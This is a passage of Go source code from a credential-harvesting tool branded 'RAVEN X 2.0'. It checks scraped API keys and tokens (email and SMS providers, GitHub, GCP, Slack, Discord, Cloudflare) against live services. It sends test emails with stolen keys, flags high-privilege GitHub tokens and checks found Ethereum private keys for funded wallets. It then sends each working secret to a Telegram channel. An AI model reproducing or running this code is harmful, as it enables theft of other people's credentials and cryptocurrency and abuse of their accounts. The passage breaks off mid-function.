					domainDetails = fmt.Sprintf("\n🌐 <b>Domains/Identities:</b> %s", strings.Join(domains, ", "))
				}
			}

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🔫 <b>MAILGUN LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
🌐 <b>Domains:</b> %s
📧 <b>Email Test:</b> %s%s
🔗 <b>Source:</b> %s
`, key, domainInfo, emailStatus, domainDetails, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Telnyx
func (a *AWSScanner) CheckTelnyx(key, sourceURL string) bool {
	if !a.Config.APIValidation.Telnyx { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, _ := http.NewRequest("GET", "https://api.telnyx.com/v2/user/balance", nil)
	req.Header.Set("Authorization", "Bearer "+key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			data, _ := res["data"].(map[string]interface{})
			balance, _ := data["balance"].(string)
			currency, _ := data["currency"].(string)

			a.logValid("Telnyx", fmt.Sprintf("Key: %s | Balance: %s %s", key, balance, currency))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_telnyx.txt")
			a.storeValidKeyLimit("Telnyx", key, fmt.Sprintf("%s %s", balance, currency))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📞 <b>TELNYX LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
💰 <b>Balance:</b> %s %s
🔗 <b>Source:</b> %s
`, key, balance, currency, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas MessageBird
func (a *AWSScanner) CheckMessageBird(key, sourceURL string) bool {
	if !a.Config.APIValidation.MessageBird { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	// Endpoint untuk memeriksa status API key
	req, _ := http.NewRequest("GET", "https://rest.messagebird.com/balance", nil)
	req.Header.Set("Authorization", "AccessKey "+key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			amount, _ := res["amount"].(float64)
			currency, _ := res["currency"].(string)

			a.logValid("MessageBird", fmt.Sprintf("Key: %s | Balance: %.2f %s", key, amount, currency))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_messagebird.txt")
			a.storeValidKeyLimit("MessageBird", key, fmt.Sprintf("%.2f %s", amount, currency))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🐦 <b>MESSAGEBIRD LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
💰 <b>Balance:</b> %.2f %s
🔗 <b>Source:</b> %s
`, key, amount, currency, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Brevo
func (a *AWSScanner) CheckBrevo(key, sourceURL string) bool {
	if !a.Config.APIValidation.Brevo {
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, _ := http.NewRequest("GET", "https://api.brevo.com/v3/account", nil)
	req.Header.Set("api-key", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			email, _ := res["email"].(string)
			company, _ := res["companyName"].(string)

			// Ambil fromEmail dari account info
			fromEmail := email

			// Coba kirim email
			emailResult := a.SendEmailViaBrevo(key, sourceURL, fromEmail)

			a.logValid("Brevo", fmt.Sprintf("Key: %s | Email: %s", key, email))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_brevo.txt")

			emailStatus := "❌ Failed"
			quotaInfo := ""
			if emailResult["success"].(bool) {
				emailStatus = "✅ Success"
				if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
					if quotaRemaining, ok2 := emailResult["quota_remaining"].(float64); ok2 {
						quotaInfo = fmt.Sprintf(" | Quota: %.0f/%.0f", quotaRemaining, quotaLimit)
					}
				}
			}
			a.storeValidKeyLimit("Brevo", key, fmt.Sprintf("Email: %s | Company: %s%s", email, company, quotaInfo))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			quotaDetails := ""
			if emailResult["success"].(bool) {
				if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
					if quotaRemaining, ok2 := emailResult["quota_remaining"].(float64); ok2 {
						quotaDetails = fmt.Sprintf("\n📊 <b>Quota Limit:</b> %.0f\n📬 <b>Remaining:</b> %.0f", quotaLimit, quotaRemaining)
					}
				}
			}

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📧 <b>BREVO LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
📧 <b>Email:</b> %s
🏢 <b>Company:</b> %s
📧 <b>Email Test:</b> %s%s
🔗 <b>Source:</b> %s
`, key, email, company, emailStatus, quotaDetails, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas XSMTP
func (a *AWSScanner) CheckXSMTP(key, sourceURL string) bool {
	if !a.Config.APIValidation.XSMTP {
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, _ := http.NewRequest("GET", "https://api.xsmtp.com/v1/account", nil)
	req.Header.Set("api-key", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			a.logValid("XSMTP", key)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_xsmtp.txt")
			a.storeValidKeyLimit("XSMTP", key, "Active")

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📧 <b>XSMTP LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Tencent Cloud
func (a *AWSScanner) CheckTencent(key, sourceURL string) bool {
	if !a.Config.APIValidation.Tencent {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Save pattern match regardless of validation outcome.
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "tencent_found.txt")

	// Tencent STS — DescribeInstances without a valid HMAC signature returns
	// AuthFailure.InvalidSecretKey (HTTP 401) when the SecretId is recognised
	// but the signature is wrong, and AuthFailure.SecretIdNotFound (HTTP 401)
	// when the SecretId is unknown. A 200 with no error code confirms the key.
	// We attach the key so Tencent can at least route by SecretId.
	req, err := http.NewRequest("GET", "https://cvm.tencentcloudapi.com/", nil)
	if err != nil {
		return false
	}
	req.Header.Set("X-TC-Action", "DescribeInstances")
	req.Header.Set("X-TC-Version", "2017-03-12")
	req.Header.Set("X-TC-SecretId", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	// Only treat HTTP 200 with a valid JSON body (no "Error" field) as confirmed.
	if resp.StatusCode == 200 {
		var body map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&body)
		if resp2, ok := body["Response"].(map[string]interface{}); ok {
			if _, hasErr := resp2["Error"]; !hasErr {
				a.logValid("Tencent", key)
				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_tencent.txt")
				a.storeValidKeyLimit("Tencent", key, "Active")

				globalCounters.mu.Lock()
				globalCounters.APIsValidated++
				globalCounters.mu.Unlock()

				msg := fmt.Sprintf("☁️ <b>TENCENT</b> — <code>%s</code>\n🔗 %s", key, sourceURL)
				go a.sendTelegram(msg)
				return true
			}
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Mandrill
func (a *AWSScanner) CheckMandrill(key, sourceURL string) bool {
	if !a.Config.APIValidation.Mandrill {
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	payload := map[string]string{"key": key}
	jsonPayload, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", "https://mandrillapp.com/api/1.0/users/info.json", bytes.NewReader(jsonPayload))
	req.Header.Set("Content-Type", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			username, _ := res["username"].(string)

			// Ambil fromEmail dari user info
			fromEmail := username

			// Coba kirim email
			emailResult := a.SendEmailViaMandrill(key, sourceURL, fromEmail)

			a.logValid("Mandrill", fmt.Sprintf("Key: %s | User: %s", key, username))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_mandrill.txt")

			emailStatus := "❌ Failed"
			if emailResult["success"].(bool) {
				emailStatus = "✅ Success"
			}
			a.storeValidKeyLimit("Mandrill", key, fmt.Sprintf("User: %s | Email: %s", username, emailStatus))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📧 <b>MANDRILL LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
👤 <b>User:</b> %s
📧 <b>Email Test:</b> %s
🔗 <b>Source:</b> %s
`, key, username, emailStatus, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas MailerSend
func (a *AWSScanner) CheckMailerSend(key, sourceURL string) bool {
	if !a.Config.APIValidation.MailerSend {
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, _ := http.NewRequest("GET", "https://api.mailersend.com/v1/domains", nil)
	req.Header.Set("Authorization", "Bearer "+key)
	req.Header.Set("X-Requested-With", "XMLHttpRequest")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			data, _ := res["data"].([]interface{})
			domainCount := len(data)

			// Ambil fromEmail dari domain yang tersedia
			var fromEmail string
			if data, ok := res["data"].([]interface{}); ok && len(data) > 0 {
				if firstDomain, ok := data[0].(map[string]interface{}); ok {
					if name, ok := firstDomain["name"].(string); ok && name != "" {
						fromEmail = fmt.Sprintf("noreply@%s", name)
					}
				}
			}

			// Coba kirim email
			emailResult := a.SendEmailViaMailerSend(key, sourceURL, fromEmail)

			a.logValid("MailerSend", fmt.Sprintf("Key: %s | Domains: %d", key, domainCount))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_mailersend.txt")

			emailStatus := "❌ Failed"
			if emailResult["success"].(bool) {
				emailStatus = "✅ Success"
			}
			a.storeValidKeyLimit("MailerSend", key, fmt.Sprintf("%d Domains | Email: %s", domainCount, emailStatus))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📧 <b>MAILERSEND LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
🌐 <b>Domains:</b> %d
📧 <b>Email Test:</b> %s
🔗 <b>Source:</b> %s
`, key, domainCount, emailStatus, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Aliyun
func (a *AWSScanner) CheckAliyun(accessKey, secretKey, sourceURL string) bool {
	// Aliyun scanning disabled
	return false
}

// Fungsi untuk mengecek validitas Nexmo/Vonage
func (a *AWSScanner) CheckNexmo(key, secret, sourceURL string) bool {
	if !a.Config.APIValidation.Nexmo { // Pengecekan fitur baru
		return false
	}

	pair := key + ":" + secret
	if _, loaded := a.KnownKeys.LoadOrStore(pair, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Move credentials out of the query string (server logs, referrer headers, browser history exposure)
	// and into the standard HTTP Basic auth header. The endpoint and method are unchanged.
	req, _ := http.NewRequest("GET", "https://rest.nexmo.com/account/get-balance", nil)
	req.Header.Set("Accept", "application/json")
	req.SetBasicAuth(key, secret)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			value, _ := res["value"].(float64)

			a.logValid("Nexmo", fmt.Sprintf("Key: %s | Balance: %.2f EUR", key, value))
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), key, secret), "valid_nexmo.txt")
			a.storeValidKeyLimit("Nexmo", key, fmt.Sprintf("%.2f EUR", value))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
💬 <b>NEXMO/VONAGE LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔐 <b>Secret:</b> <code>%s</code>
💰 <b>Balance:</b> %.2f EUR
🔗 <b>Source:</b> %s
`, key, secret, value, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// CheckGitHubToken validates a GitHub personal access token (new ghp_/gho_/ghs_/ghr_ format)
// by hitting GET /user with the token as a Bearer credential. 200 = valid token.
func (a *AWSScanner) CheckGitHubToken(key, sourceURL string) bool {
	if !a.Config.APIValidation.GitHub {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.github.com/user", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "token "+key)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		// X-OAuth-Scopes header reveals the token's blast radius before doing
		// anything else — a token with admin:org + delete_repo + workflow is
		// effectively root on the organisation.
		scopes := resp.Header.Get("X-OAuth-Scopes")
		var res map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&res)
		login, _ := res["login"].(string)

		a.logValid("GitHub", fmt.Sprintf("Token: %s | User: %s | Scopes: %s", key, login, scopes))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_github.txt")
		a.storeValidKeyLimit("GitHub", key, fmt.Sprintf("@%s (scopes: %s)", login, scopes))

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		highValueScopes := []string{"admin:org", "delete_repo", "workflow", "admin:repo_hook"}
		scopeRisk := "🟡 Standard"
		for _, s := range highValueScopes {
			if strings.Contains(scopes, s) {
				scopeRisk = "🔴 HIGH-VALUE"
				break
			}
		}

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🐙 <b>GITHUB LIVE TOKEN</b>

🔑 <b>Token:</b> <code>%s</code>
👤 <b>User:</b> @%s
🔐 <b>Scopes:</b> <code>%s</code>
⚡ <b>Risk:</b> %s
🔗 <b>Source:</b> %s
`, key, login, scopes, scopeRisk, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// CheckGCPKey validates a Google Cloud Platform / Google API key (AIza prefix)
// by probing the Cloud Resource Manager API. 200 = key accepted; 403 with
// ACCESS_NOT_CONFIGURED or similar means the key exists but lacks that API scope
// (still a live key); 400 API_KEY_INVALID = dead key.
func (a *AWSScanner) CheckGCPKey(key, sourceURL string) bool {
	if !a.Config.APIValidation.GCP {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	// Use the Geocoding API as a lightweight probe — no billing required for a
	// zero-result query and the response clearly distinguishes INVALID_KEY from
	// REQUEST_DENIED (key valid but restricted) vs OK.
	req, err := http.NewRequest("GET",
		"https://maps.googleapis.com/maps/api/geocode/json?address=test&key="+key, nil)
	if err != nil {
		return false
	}

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		var res map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&res)
		status, _ := res["status"].(string)
		// INVALID_KEY = dead. REQUEST_DENIED / ZERO_RESULTS / OK = live key.
		if status == "REQUEST_DENIED" {
			// Key exists but is restricted — still a valid key worth saving.
			// Check error_message to distinguish INVALID_KEY embedded in a 200.
			if errMsg, ok := res["error_message"].(string); ok && strings.Contains(errMsg, "API key not valid") {
				return false
			}
		}
		if status != "INVALID_KEY" && status != "" {
			a.logValid("GCP", fmt.Sprintf("Key: %s | Status: %s", key, status))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_gcp.txt")
			a.storeValidKeyLimit("GCP", key, fmt.Sprintf("Status: %s", status))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
☁️ <b>GCP API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
📊 <b>Status:</b> %s
🔗 <b>Source:</b> %s
`, key, status, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// ethAddressFromPrivKey derives the checksummed Ethereum address from a 32-byte
// secp256k1 private key (hex string, no 0x prefix). Returns empty string on error.
func ethAddressFromPrivKey(hexKey string) string {
	keyBytes := make([]byte, 32)
	for i := 0; i < 32; i++ {
		b, err := strconv.ParseUint(hexKey[i*2:i*2+2], 16, 8)
		if err != nil {
			return ""
		}
		keyBytes[i] = byte(b)
	}
	// Reject zero key (invalid on secp256k1)
	allZero := true
	for _, b := range keyBytes {
		if b != 0 {
			allZero = false
			break
		}
	}
	if allZero {
		return ""
	}
	// Derive public key from private key bytes
	privKey := secp256k1.PrivKeyFromBytes(keyBytes)
	pubKey := privKey.PubKey()
	// Uncompressed public key: 0x04 || X(32) || Y(32) = 65 bytes
	pubBytes := pubKey.SerializeUncompressed()
	if len(pubBytes) != 65 {
		return ""
	}
	// Keccak256 of the 64 public key bytes (drop the 0x04 prefix)
	h := sha3.NewLegacyKeccak256()
	h.Write(pubBytes[1:])
	hash := h.Sum(nil)
	// ETH address = last 20 bytes of the hash, lowercase hex with 0x prefix
	return fmt.Sprintf("0x%x", hash[12:])
}

// ethWalletStatus queries two free public ETH RPC endpoints for the wallet's
// balance (wei) and nonce (outbound tx count). Returns (balanceWei, nonce, ok).
// ok=false means the RPC was unreachable — caller should treat as unconfirmed.
func ethWalletStatus(address string) (balanceWei string, nonce int64, ok bool) {
	endpoints := []string{
		"https://eth.llamarpc.com",
		"https://cloudflare-eth.com",
	}
	type rpcResp struct {
		Result string `json:"result"`
	}
	httpClient := &http.Client{Timeout: 6 * time.Second}
	for _, ep := range endpoints {
		// eth_getBalance
		balBody := fmt.Sprintf(
			`{"jsonrpc":"2.0","method":"eth_getBalance","params":["%s","latest"],"id":1}`,
			address)
		resp, err := httpClient.Post(ep, "application/json", strings.NewReader(balBody))
		if err != nil {
			continue
		}
		var r rpcResp
		_ = json.NewDecoder(resp.Body).Decode(&r)
		resp.Body.Close()
		if r.Result == "" || r.Result == "0x" {
			continue
		}
		// Parse hex balance
		balHex := strings.TrimPrefix(r.Result, "0x")
		bal := int64(0)
		for _, c := range balHex {
			n := int64(0)
			if c >= '0' && c <= '9' {
				n = int64(c - '0')
			} else if c >= 'a' && c <= 'f' {
				n = int64(c-'a') + 10
			}
			bal = bal*16 + n
			if bal > 1e18 { // cap to avoid overflow; > 1 ETH is plenty
				bal = int64(1e18) + 1
				break
			}
		}

		// eth_getTransactionCount
		noncBody := fmt.Sprintf(
			`{"jsonrpc":"2.0","method":"eth_getTransactionCount","params":["%s","latest"],"id":2}`,
			address)
		resp2, err2 := httpClient.Post(ep, "application/json", strings.NewReader(noncBody))
		nc := int64(0)
		if err2 == nil {
			var r2 rpcResp
			_ = json.NewDecoder(resp2.Body).Decode(&r2)
			resp2.Body.Close()
			ncHex := strings.TrimPrefix(r2.Result, "0x")
			for _, c := range ncHex {
				n := int64(0)
				if c >= '0' && c <= '9' {
					n = int64(c - '0')
				} else if c >= 'a' && c <= 'f' {
					n = int64(c-'a') + 10
				}
				nc = nc*16 + n
			}
		}
		return r.Result, nc, true
	}
	return "", 0, false
}

// CheckCryptoWallet derives the Ethereum address from the candidate private key,
// queries the blockchain to confirm the wallet is active (non-zero balance OR has
// sent at least one transaction), and only fires a Telegram alert for live wallets.
// Inactive candidates are still saved to valid_crypto.txt for manual review.
func (a *AWSScanner) CheckCryptoWallet(key, sourceURL string) bool {
	if !a.Config.APIValidation.Crypto {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	// Strip optional 0x prefix and normalise to lowercase.
	raw := strings.TrimPrefix(strings.ToLower(key), "0x")
	if len(raw) != 64 {
		return false
	}
	// Trivially invalid keys
	if raw == "0000000000000000000000000000000000000000000000000000000000000000" ||
		raw == "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" {
		return false
	}
	// Low-entropy rejection: JS bundles and hash constants often produce 64-char
	// hex strings that are clearly not random. A real 256-bit private key should
	// have ≥10 distinct hex digits. Fewer than 8 means the string is repetitive.
	distinctNibbles := map[byte]struct{}{}
	for i := 0; i < len(raw); i++ {
		distinctNibbles[raw[i]] = struct{}{}
	}
	if len(distinctNibbles) < 8 {
		return false
	}

	// Derive the ETH address from this private key
	address := ethAddressFromPrivKey(raw)
	if address == "" {
		return false
	}

	// Always save candidate to file for offline review
	a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), key, address), "valid_crypto.txt")

	// Query blockchain — only alert on wallets with real activity
	balWei, nonce, rpcOK := ethWalletStatus(address)
	isActive := rpcOK && (balWei != "0x0" && balWei != "0x" || nonce > 0)

	if !isActive {
		// Save but don't spam Telegram with inactive/unknown wallets
		a.logValid("Crypto", fmt.Sprintf("ETH candidate (inactive/unverified) key=%s addr=%s", key[:8]+"…", address))
		return false
	}

	// Live wallet confirmed — fire the alert
	a.logValid("Crypto", fmt.Sprintf("LIVE ETH wallet! addr=%s nonce=%d", address, nonce))
	a.storeValidKeyLimit("Crypto", address, fmt.Sprintf("balance=%s nonce=%d", balWei, nonce))

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	// Format balance as ETH (approximate)
	balDisplay := "unknown"
	if balWei != "" && balWei != "0x" && balWei != "0x0" {
		balDisplay = balWei + " wei"
	}

	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
💎 <b>LIVE ETH WALLET FOUND</b>

🏦 <b>Address:</b> <code>%s</code>
🔑 <b>Key:</b> <code>%s</code>
💰 <b>Balance:</b> %s
📤 <b>Transactions sent:</b> %d
🔗 <b>Source:</b> %s
`, address, key, balDisplay, nonce, sourceURL)
	go a.sendTelegram(msg)
	return true
}

// CheckSlack validates a Slack bot token (xoxb-) via auth.test.
func (a *AWSScanner) CheckSlack(key, sourceURL string) bool {
	if !a.Config.APIValidation.Slack {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}
	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "slack_found.txt")
	req, err := http.NewRequest("GET", "https://slack.com/api/auth.test", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		var res map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&res)
		if ok, _ := res["ok"].(bool); ok {
			team, _ := res["team"].(string)
			slackUser, _ := res["user"].(string)
			a.logValid("Slack", fmt.Sprintf("Token: %s | Team: %s | User: %s", key, team, slackUser))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_slack.txt")
			a.storeValidKeyLimit("Slack", key, fmt.Sprintf("Team: %s User: %s", team, slackUser))
			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()
			msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n💬 <b>SLACK BOT TOKEN LIVE</b>\n\n🔑 <b>Token:</b> <code>%s</code>\n🏢 <b>Team:</b> %s\n👤 <b>User:</b> %s\n🔗 <b>Source:</b> %s", key, team, slackUser, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// CheckDiscord validates a Discord bot token via GET /users/@me.
func (a *AWSScanner) CheckDiscord(key, sourceURL string) bool {
	if !a.Config.APIValidation.Discord {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}
	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "discord_found.txt")
	req, err := http.NewRequest("GET", "https://discord.com/api/v10/users/@me", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bot "+key)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		var res map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&res)
		if id, _ := res["id"].(string); id != "" {
			username, _ := res["username"].(string)
			a.logValid("Discord", fmt.Sprintf("Token: %s | Bot: %s", key, username))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_discord_bot.txt")
			a.storeValidKeyLimit("Discord", key, fmt.Sprintf("Bot: %s", username))
			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()
			msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🎮 <b>DISCORD BOT TOKEN LIVE</b>\n\n🔑 <b>Token:</b> <code>%s</code>\n🤖 <b>Bot:</b> %s\n🔗 <b>Source:</b> %s", key, username, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// CheckCloudflare validates a Cloudflare API token via /user/tokens/verify.
func (a *AWSScanner) CheckCloudflare(key, sourceURL string) bool {
	if !a.Config.APIValidation.Cloudflare {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}
	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "cloudflare_found.txt")
	req, err := http.NewRequest("GET", "https://api.cloudflare.com/client/v4/user/tokens/verify", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		var res map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&res)
		if result, ok := res["result"].(map[string]interface{}); ok {
